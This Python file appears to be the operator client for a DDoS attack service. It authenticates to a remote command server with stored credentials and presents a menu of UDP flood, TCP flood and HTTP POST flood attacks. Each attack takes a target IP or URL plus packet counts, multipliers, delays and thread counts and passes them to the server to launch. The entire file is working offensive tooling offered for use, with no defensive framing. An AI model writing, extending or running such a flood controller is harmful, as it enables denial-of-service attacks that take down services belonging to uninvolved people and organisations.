from json import loads
from socket import socket, AF_INET, SOCK_STREAM
from threading import Thread
from time import sleep

class config:
  def __init__(self) -> None:
    self.config = loads(open("./config.json", 'r+').read())

class data:
  def __init__(self) -> None:
    pass

  def send(self, client: socket, data: str) -> None:
    client.send(data.encode("utf-8"))

  def recieve(self, client: socket) -> str:
    recieved: str = client.recv(1024).decode("utf-8").strip()
    return recieved
  
class attacks:
  def __init__(self) -> None:
    self.data: data = data()

  def getStatus(self, client: socket) -> None:
    Running = True
    while Running:
      try:
        data = client.recv(1024).decode("utf-8")
        if data == "Stopped":
          Running = False
        if data is None or "":
          pass
        else:
          print(data)
      except Exception as e:
        print(e)

  def SendUDP(self, client: socket) -> None:
    ip: str = input("IP:\t")
    self.data.send(client, ip)
    port: str = str(input("Port (Ex: 53):\t"))
    self.data.send(client, port)
    tries: str = str(input("Tries (Ex: 10):\t"))
    self.data.send(client, tries)
    packets: str = str(input("Packets (Ex: 15000):\t"))
    self.data.send(client, packets)
    repack: str = str(input("Packet Multiplier (Ex: 100):\t"))
    self.data.send(client, repack)
    trydelay: str = str(input("Try Delay: S (Ex: 1):\t"))
    self.data.send(client, trydelay)
    senddelay: str = str(input("Send Delay: MS (Ex: 5):\t"))
    self.data.send(client, senddelay)
    size: str = str(input("Data Size (Ex: 3100):\t"))
    self.data.send(client, size)
    threads: str = str(input("Threads (Ex: 150):\t"))
    self.data.send(client, threads)
    sleep(0.5)
    self.getStatus(client)
    

  def SendTCP(self, client: socket) -> None:
    ip: str = input("IP:\t")
    self.data.send(client, ip)
    port: str = str(input("Port (Ex: 80):\t"))
    self.data.send(client, port)
    tries: str = str(input("Tries (Ex: 10):\t"))
    self.data.send(client, tries)
    packets: str = str(input("Packets (Ex: 15000):\t"))
    self.data.send(client, packets)
    repack: str = str(input("Packet Multiplier (Ex: 100):\t"))
    self.data.send(client, repack)
    trydelay: str = str(input("Try Delay: S (Ex: 1):\t"))
    self.data.send(client, trydelay)
    senddelay: str = str(input("Send Delay: MS (Ex: 5):\t"))
    self.data.send(client, senddelay)
    size: str = str(input("Data Size (Ex: 3100):\t"))
    self.data.send(client, size)
    threads: str = str(input("Threads (Ex: 150):\t"))
    self.data.send(client, threads)
    sleep(0.5)
    self.getStatus(client)
  
  def SendPOST(self, client: socket) -> None:
    url: str = input("URL (Ex: https://website.com/):\t")
    self.data.send(client, url)
    packets: str = str(input("Packets (Ex: 15000):\t"))
    self.data.send(client, packets)
    multiplier: str = str(input("Packet Multiplier (Ex: 30):\t"))
    self.data.send(client, multiplier)
    senddelay: str = str(input("Send Delay: MS (Ex: 10):\t"))
    self.data.send(client, senddelay)
    size: str = str(input("Data Size (Ex: 5000):\t"))
    self.data.send(client, size)
    threads: str = str(input("Threads (Ex: 150):\t"))
    self.data.send(client, threads)
    sleep(0.5)
    self.getStatus(client)

  

class client:
  def __init__(self) -> None:
    self.s: socket = socket(AF_INET, SOCK_STREAM)
    self.data: data = data()
    self.config: config = config()
    self.attacks: attacks = attacks()

    self.ip = self.config.config["server"]["ip"]
    self.port = self.config.config["server"]["port"]
    self.username = self.config.config["creds"]["username"]
    self.password = self.config.config["creds"]["password"]

  

  def menu(self, client: socket) -> None:
    sleep(0.3)
    print(self.data.recieve(client)) # splashscreen / help menu
    op: str = input(">\t").upper()
    self.data.send(client, op)

    match op:
      case "UDP":
        self.attacks.SendUDP(client)
      case "TCP":
        self.attacks.SendTCP(client)
      case "POST":
        self.attacks.SendPOST(client)
      case "PING":
        sleep(0.1)
        print(self.data.recieve(client)) # Pong!
        sleep(0.5)
      case "HELP":
        sleep(0.1)
        #goto ln:68
      case _:
        sleep(0.1)
        #goto ln:68

  def main(self) -> None:
    try:
      self.s.connect((self.ip, self.port))
    except Exception as e:
      print("Exception:\t",e)

    # send login
    try:
      self.data.send(self.s, self.username)
      sleep(0.1) # i hate socket
      self.data.send(self.s, self.password)
    except Exception as e:
      print("Exception:\t",e)

    # recieve login status
    try:
      data = self.data.recieve(self.s)
      if data == "Success": # don't even try to "crack" it. it'll just break dumbass.
        sleep(0.1)
        while True:
          self.menu(self.s)
      else:
        print(data)
        input("Press any key to continue...")
        exit()
    except Exception as e:
      print("Exception:\t",e)

if __name__ == "__main__":
  try:
    Client: client = client()
    Client.main()
  except KeyboardInterrupt:
    exit()
else:
  exit()